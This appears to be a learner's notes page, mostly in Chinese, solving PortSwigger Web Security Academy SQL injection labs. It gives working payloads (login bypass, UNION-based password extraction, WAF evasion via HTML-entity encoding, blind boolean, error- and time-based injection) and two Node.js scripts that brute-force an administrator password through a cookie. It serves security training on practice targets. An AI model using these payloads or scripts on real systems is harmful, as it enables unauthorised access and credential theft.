---
title: SQL Injection
description: SQL Injection
last_update:
  date: "2025-08-08T08:00:00+08:00"
---

## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

| Dimension | Description                                                                 |
| --------- | --------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/sql-injection#retrieving-hidden-data   |
| Lab       | https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data |

Payload

```
?category=Accessories' OR 1=1--
```

SQL

```sql
SELECT ... FROM products WHERE category = 'Accessories' OR 1=1--'
```

## Lab: SQL injection vulnerability allowing login bypass

| Dimension | Description                                                                     |
| --------- | ------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/sql-injection#subverting-application-logic |
| Lab       | https://portswigger.net/web-security/sql-injection/lab-login-bypass             |

Payload

```
administrator' OR 1=1--
```

SQL

```sql
SELECT ... FROM users WHERE username = 'administrator' OR 1=1--' AND password = '123'
```

## Lab: SQL injection with filter bypass via XML encoding

| Dimension | Description                                                                                              |
| --------- | -------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/sql-injection#sql-injection-in-different-contexts                   |
| Lab       | https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding |

先嘗試用 `UNION SELECT NULL--` 來判斷前面的 `SELECT` 選了幾個 columns

```
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--
```

Payload

```
1 UNION SELECT password FROM users WHERE username = 'administrator'--
```

SQL

```sql
SELECT unit FROM stocks WHERE productId = 1 AND storeId = 1 UNION SELECT password FROM users WHERE username = 'administrator'--'
```

轉換成 HTML Entity 來繞過 WAF

```
&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#32;&#119;&#104;&#101;&#114;&#101;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#61;&#32;&#39;&#97;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#39;&#45;&#45;
```

最終在 F12 > console 送出的 fetch 請求

```js
fetch("/product/stock", {
  headers: {
    "content-type": "application/xml",
  },
  body: '<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#32;&#119;&#104;&#101;&#114;&#101;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#61;&#32;&#39;&#97;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#39;&#45;&#45;</storeId></stockCheck>',
  method: "POST",
})
  .then((res) => res.text())
  .then((res) => console.log(res));
```

console 的結果

```
020yk5zmzoy92jl364rg
217 units
```

接下來用 `administrator` + `020yk5zmzoy92jl364rg` 就可以成功登入～

## Lab: SQL injection attack, querying the database type and version on Oracle

| Dimension | Description                                                                                                      |
| --------- | ---------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/sql-injection/examining-the-database#querying-the-database-type-and-version |
| Lab       | https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle   |

題目給的 Hint 很重要:

On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

先嘗試用 `UNION SELECT NULL FROM dual--` 來判斷前面的 `SELECT` 選了幾個 columns

```
?category=Accessories' UNION SELECT NULL FROM dual--
?category=Accessories' UNION SELECT NULL,NULL FROM dual--
```

Payload

```
?category=Accessories' UNION SELECT banner,NULL FROM v$version--
```

SQL

```sql
SELECT ... FROM products WHERE category = 'Accessories' UNION SELECT banner,NULL FROM v$version--'
```

## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

| Dimension | Description                                                                                                             |
| --------- | ----------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/sql-injection/examining-the-database#querying-the-database-type-and-version        |
| Lab       | https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft |

這題稍微卡了一下，主要的卡點有兩個

1. comment 格式，可參考 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet#comments)，最終得出需使用 `#comment` 的格式，才可以滿足 MySQL and Microsoft
2. `#` 是 URL hash，所以需使用 `encodeURLComponent` 才能塞到 querystring

先嘗試用 `UNION SELECT NULL #` 來判斷前面的 `SELECT` 選了幾個 columns

```
?category=Lifestyle' UNION SELECT NULL#
?category=Lifestyle' UNION SELECT NULL,NULL#
```

記得放到網址的時候要使用 JS 的 `encodeURIComponent` 去做轉換

```js
encodeURIComponent("Lifestyle' UNION SELECT NULL#");
("Lifestyle'%20UNION%20SELECT%20NULL%23");

encodeURIComponent("Lifestyle' UNION SELECT NULL,NULL#");
("Lifestyle'%20UNION%20SELECT%20NULL%2CNULL%23");
```

實際訪問的 querystring

```
?category=Lifestyle'%20UNION%20SELECT%20NULL%23
?category=Lifestyle'%20UNION%20SELECT%20NULL%2CNULL%23
```

確認 columns 是兩個後，改成以下 Payload

```
# 轉換前
?category=Lifestyle' UNION SELECT @@version,NULL#

# 轉換後
?category=Lifestyle'%20UNION%20SELECT%20%40%40version%2CNULL%23
```

SQL

```sql
SELECT ... FROM products WHERE category = 'Lifestyle' UNION SELECT @@version,NULL#'
```

## Lab: SQL injection attack, listing the database contents on non-Oracle databases

| Dimension | Description                                                                                                        |
| --------- | ------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/sql-injection/examining-the-database#listing-the-contents-of-the-database     |
| Lab       | https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle |

根據 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet#comments)，最終得出需使用 `-- ` 的格式來當作註解，嘗試用 `UNION SELECT NULL` 慢慢猜出 `SELECT` 的 columns 數量

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Gifts' UNION SELECT NULL FROM information_schema.tables-- ",
);
const href = url.href;
window.open(href, "_blank");
```

列出所有 tables，尋找 `users` 關鍵字，找到 table_name 是 `users_fdytnd`

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Gifts' UNION SELECT table_name,NULL FROM information_schema.tables-- ",
);
const href = url.href;
window.open(href, "_blank");
```

列出 `users_fdytnd` 底下的 `column_name,data_type`，找到帳密的 columns 是 `username_lfypib` 跟 `password_tltvdy`

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Gifts' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name = 'users_fdytnd'-- ",
);
const href = url.href;
window.open(href, "_blank");
```

接下來就可以查詢 `administrator` 的密碼並且登入

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Gifts' UNION SELECT username_lfypib,password_tltvdy FROM users_fdytnd WHERE username_lfypib = 'administrator'-- ",
);
const href = url.href;
window.open(href, "_blank");
```

這題我覺得可以延伸，因為我以前從來沒有研究過 `information_schema` 這個 Database 的內容，所以我是直接下載 [XAMPP](https://www.apachefriends.org/zh_tw/download.html)，使用 `phpmyadmin` 的 GUI 來觀察 `information_schema` 的內容，並且嘗試下 SQL 語法，一步一步拆解，過程真的非常有趣～

## Lab: SQL injection attack, listing the database contents on Oracle

| Dimension | Description                                                                                                          |
| --------- | -------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/sql-injection/examining-the-database#listing-the-contents-of-an-oracle-database |
| Lab       | https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle       |

跟上一題的概念一樣，只是改成 Oracle 的語法，先用 `UNION SELECT NULL` 來猜出 `SELECT` 的 columns 數量

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Corporate gifts' UNION SELECT NULL,NULL FROM all_tables--",
);
const href = url.href;
window.open(href, "_blank");
```

確定是兩個 columns 後，把 `NULL` 改成 `table_name`，確定是 `USERS_LCHIFI` 這張 table

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Corporate gifts' UNION SELECT table_name,NULL FROM all_tables--",
);
const href = url.href;
window.open(href, "_blank");
```

查一下 `USERS_LCHIFI` 有哪些 columns，確定帳密是 `USERNAME_MMUPPE` 跟 `PASSWORD_SNQVCH`

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Corporate gifts' UNION SELECT column_name,data_type FROM all_tab_columns WHERE table_name = 'USERS_LCHIFI'--",
);
const href = url.href;
window.open(href, "_blank");
```

開始查 `administrator` 的密碼

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Corporate gifts' UNION SELECT USERNAME_MMUPPE,PASSWORD_SNQVCH FROM USERS_LCHIFI WHERE USERNAME_MMUPPE = 'administrator'--",
);
const href = url.href;
window.open(href, "_blank");
```

## Lab: SQL injection UNION attack, determining the number of columns returned by the query

| Dimension | Description                                                                                                 |
| --------- | ----------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/sql-injection/union-attacks#determining-the-number-of-columns-required |
| Lab       | https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns            |

這題意外的簡單，利用前面的技術 `UNION SELECT NULL` 來判斷 `SELECT` 多少 columns

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append("category", "Lifestyle' UNION SELECT NULL,NULL,NULL--");
const href = url.href;
window.open(href, "_blank");
```

## Lab: SQL injection UNION attack, finding a column containing text

| Dimension | Description                                                                                              |
| --------- | -------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/sql-injection/union-attacks#finding-columns-with-a-useful-data-type |
| Lab       | https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text         |

承接上一題，就是把 `NULL` 換成題目指定的字串 `bpaLX3`，看哪個 index 換掉會成功

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Lifestyle' UNION SELECT NULL,'bpaLX3',NULL--",
);
const href = url.href;
window.open(href, "_blank");
```

## Lab: SQL injection UNION attack, retrieving data from other tables

| Dimension | Description                                                                                                                      |
| --------- | -------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/sql-injection/union-attacks#using-a-sql-injection-union-attack-to-retrieve-interesting-data |
| Lab       | https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables                             |

怎麼感覺跟前面的題目有點像@@

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Lifestyle' UNION SELECT username,password FROM users--",
);
const href = url.href;
window.open(href, "_blank");
```

## Lab: SQL injection UNION attack, retrieving multiple values in a single column

| Dimension | Description                                                                                                        |
| --------- | ------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/sql-injection/union-attacks#retrieving-multiple-values-within-a-single-column |
| Lab       | https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column     |

結合前面學到的，要猜出哪個 column 是 string

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Accessories' UNION SELECT NULL,password FROM users WHERE username = 'administrator'--",
);
const href = url.href;
window.open(href, "_blank");
```

## Lab: Blind SQL injection with conditional responses

| Dimension | Description                                                                                                                 |
| --------- | --------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-responses |
| Lab       | https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses                                          |

這題稍微麻煩，要一個一個字元去猜，先找出密碼的長度，結果是 20 碼

```sql
HsacENgP06akYysN' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20) = 'a
```

之後就是用二分法，一個一個把字元猜出來

```sql
AND SUBSTRING((SELECT password from users WHERE username = 'administrator'), 1, 1) > 'm
```

正常 SQL

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'HsacENgP06akYysN'
```

Injected SQL

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'HsacENgP06akYysN' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20) = 'a'
```

這題要手動爆破會累死，基本上是要工具，本來沒有下載 Burp Suite，但我看 PortSwigger 的課程一直推薦自家產品，所以還是學一下好了XD

## Lab: Blind SQL injection with conditional errors

| Dimension | Description                                                                                                              |
| --------- | ------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-errors |
| Lab       | https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors                                          |

主要的卡點

1. 之前沒有使用過 `CASE WHEN (condition) THEN (A) ELSE (B) END` 這個 SQL 語法
2. 太長的 SQL 語法我會有閱讀障礙，但如果有正常縮排，就會容易閱讀很多

這題需要先從簡單的 SQL 語法測試正常注入跟引發錯誤的情境

正常注入

```sql
jP7Ryk30JRp4JvwD' || (SELECT '' FROM dual)--
```

引發錯誤

```sql
jP7Ryk30JRp4JvwD' || (SELECT '')--
```

接著用以下 SQL 語法測試 password 的長度

- 如果 password 的長度 `> 10`，就爆炸
- 如果 password 的長度 `<= 10`，就正常

```sql
jP7Ryk30JRp4JvwD' AND (SELECT CASE WHEN (LENGTH(password) > 10) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a

jP7Ryk30JRp4JvwD' AND (
  SELECT
    CASE
      WHEN (LENGTH(password) > 10)
      THEN TO_CHAR(1/0)
      ELSE 'a'
    END
  FROM users
  WHERE username = 'administrator'
) = 'a
```

最終測出 password 長度 = 20

```sql
jP7Ryk30JRp4JvwD' AND (SELECT CASE WHEN (LENGTH(password) = 20) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a
```

再用以下 SQL 語法爆破 password 的每個字元，可以使用二分法快速鎖定目標字元

- 如果 password 第一個字元 `> 'm'`，就爆炸
- 如果 password 第一個字元 `<= 'm'`，就正常

```sql
jP7Ryk30JRp4JvwD' AND (SELECT CASE WHEN (SUBSTR(password, 1, 1) > 'm') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a

jP7Ryk30JRp4JvwD' AND (
  SELECT
    CASE
      WHEN (SUBSTR(password, 1, 1) > 'm')
      THEN TO_CHAR(1/0)
      ELSE 'a'
    END
  FROM users
  WHERE username = 'administrator'
) = 'a
```

但由於 20 碼實在太長，加上這是 httpOnly 的 cookie，沒辦法透過瀏覽器的 js 寫腳本爆破，所以我寫了一個陽春的 NodeJS 腳本來爆破

```ts
async function Blind_SQL_injection_with_conditional_errors() {
  const trackingId = "YUw5DjjA1NCBljlO";
  const session = "V6YewNgxfiwzhe7iiBEvX9APoGifBlir";
  const url =
    "https://0ad700fd041d3040808f0d46009c0089.web-security-academy.net/";
  const passwordLength = 20;
  const letters = Array(26)
    .fill(0)
    .map((_, i) => String.fromCharCode(97 + i));
  const numbers = Array(10)
    .fill(0)
    .map((_, i) => `${i}`);
  const passwordChars = letters.concat(numbers);
  const password: string[] = [];
  for (let i = 0; i < passwordLength; i++) {
    for (const passwordChar of passwordChars) {
      console.log({ i, passwordChar });
      const response = await fetch(url, {
        headers: {
          cookie: `session=${session}; TrackingId=${trackingId}' AND (SELECT CASE WHEN (SUBSTR(password, ${i + 1}, 1) = '${passwordChar}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a`,
        },
      });
      if (response.status === 500) {
        password[i] = passwordChar;
        break;
      }
    }
  }
  console.log("result");
  console.log(password.join(""));
}

Blind_SQL_injection_with_conditional_errors();
```

## Lab: Visible error-based SQL injection

| Dimension | Description                                                                                                       |
| --------- | ----------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/sql-injection/blind#extracting-sensitive-data-via-verbose-sql-error-messages |
| Lab       | https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based                    |

先嘗試在 cookies.TrackingId 注入 `'`

```
TrackingId=8F6rc8mGRxhQxZx9'
```

根據錯誤訊息，可以看到以下 SQL

```sql
SELECT * FROM tracking WHERE id = '8F6rc8mGRxhQxZx9''
```

嘗試正確的語法

```sql
SELECT * FROM tracking WHERE id = '8F6rc8mGRxhQxZx9'--'
```

再度嘗試一個正確的語法

```sql
SELECT * FROM tracking WHERE id = '8F6rc8mGRxhQxZx9' UNION SELECT password FROM users--'
```

思考了一下，這題不太可能繼續用爆破的方式，文章內有提供解題思路

You can use the `CAST()` function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an int, may cause an error similar to the following:

```
ERROR: invalid input syntax for type integer: "Example data"
```

嘗試了很多組合，最終發現這樣可以印出 `ERROR: invalid input syntax for type boolean: "administrator"`

```sql
SELECT * FROM tracking WHERE id = '' OR CAST((SELECT username FROM users LIMIT 1) AS boolean)--'
```

我猜測是 trackingId 有限制長度？因為太長的 SQL 語法會被截斷，還好第一筆就是 `administrator`，這樣就可以成功拿到密碼了

```sql
SELECT * FROM tracking WHERE id = '' OR CAST((SELECT password FROM users LIMIT 1) AS boolean)--'
```

P.S. 解完這題之後，回頭看 Solution，發現真的有限制 trackingId 的長度，而且 Solution 提供的答案跟我一樣，都是用 `LIMIT 1` 賽到的

```
Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.
```

## Lab: Blind SQL injection with time delays

| Dimension | Description                                                                                                       |
| --------- | ----------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-time-delays |
| Lab       | https://portswigger.net/web-security/sql-injection/blind/lab-time-delays                                          |

這題主要應該是要猜用什麼 DB，嘗試很多次，最終猜到是 PostgreSQL

```sql
' OR (SELECT pg_sleep(10)) IS NOT NULL--
```

## Lab: Blind SQL injection with time delays and information retrieval

| Dimension | Description                                                                                                       |
| --------- | ----------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-time-delays |
| Lab       | https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval                           |

承接上一題，我猜這題也是用 PostgreSQL，我覺得最麻煩的是不同 SQL Database 的語法不一樣

我們分析一下這段 SQL，這在 PostgreSQL 會出錯，因為 OR 條件的結果不是 Boolean

```sql
SELECT * FROM tracking WHERE id = '' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--'
```

所以我們可以用 [String concatenation](https://portswigger.net/web-security/sql-injection/cheat-sheet#string-concatenation) 的方式

```sql
SELECT * FROM tracking WHERE id = '' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--'
```

或者讓 `OR` 的條件變成 Boolean

```sql
SELECT * FROM tracking WHERE id = '' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NULL--'
```

老實說，在 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) 幾乎是可以找到大部分題目的答案或 Hint 語法，我覺得最難的地方就是，要怎麼把這些看似正常的使用方法，用駭客的思維去組合測試

既然已經確定 [Conditional time delays](https://portswigger.net/web-security/sql-injection/cheat-sheet#conditional-time-delays) 可行，接下來就是把條件改成測試密碼的長度

```sql
SELECT * FROM tracking WHERE id = '' OR (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username = 'administrator') = 20) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NULL--'
```

再來開始爆破密碼，構造以下 SQL

```sql
SELECT * FROM tracking WHERE id = '' OR (SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm' THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NULL--'
```

稍微修改 [Lab: Blind SQL injection with conditional errors](#lab-blind-sql-injection-with-conditional-errors) 的 NodeJS 程式碼

```ts
async function Blind_SQL_injection_with_time_delays_and_information_retrieval() {
  const config = {
    session: "o2anaO8pgQrKwriqAe5KQA1oXfkaAIol",
    url: "https://0acd00a6044b2fe980f6f325009d002b.web-security-academy.net/",
    passwordLength: 20,
    sleepSeconds: 5,
  };
  const password: string[] = [];
  for (let i = 0; i < config.passwordLength; i++) {
    for (const passwordChar of passwordChars) {
      console.log({ i, passwordChar });
      const timeStart = new Date().getTime();
      await fetch(config.url, {
        headers: {
          cookie: `session=${config.session}; TrackingId=' OR (SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), ${i + 1}, 1) = '${passwordChar}' THEN pg_sleep(${config.sleepSeconds}) ELSE pg_sleep(0) END) IS NULL--`,
        },
      });
      const timeEnd = new Date().getTime();
      if (timeEnd - timeStart > config.sleepSeconds * 1000) {
        console.log(`find password position ${i + 1}: ${passwordChar}`);
        password[i] = passwordChar;
        break;
      }
    }
  }
  console.log("result");
  console.log(password.join(""));
}
```

## Lab: Blind SQL injection with out-of-band interaction

| Dimension | Description                                                                                                               |
| --------- | ------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-using-out-of-band-oast-techniques |
| Lab       | https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band                                                  |

這題需要 Burp Suite Pro，暫時無法解

<!-- todo-yus Burp Suite Pro -->

## Lab: Blind SQL injection with out-of-band data exfiltration

| Dimension | Description                                                                                                               |
| --------- | ------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-using-out-of-band-oast-techniques |
| Lab       | https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration                                |

這題需要 Burp Suite Pro，暫時無法解

<!-- todo-yus Burp Suite Pro -->

## 小結

這系列的挑戰過得真快，不到一週就結束了，我覺得有讓我對 SQL Injection 更加了解。但畢竟我目前還是個前端工程師，工作不會接觸到 SQL，所以我覺得要時常來複習，不然很快就會忘記了QQ

另外，我覺得只靠這 10 幾個練習題，不足以面對真實世界的 SQL Injection，畢竟這些練習題只是把各種重點概念都練習過一次，總覺得好像學到了，但又不夠精深，所以之後會再規劃其他 SQL 相關的學習，例如 [nmap MySQL Scripts](../web-security/nmap-mysql-scripts.md) 跟 [sqlmap](../web-security/sqlmap.md)。

## 參考資料

- https://portswigger.net/web-security/sql-injection
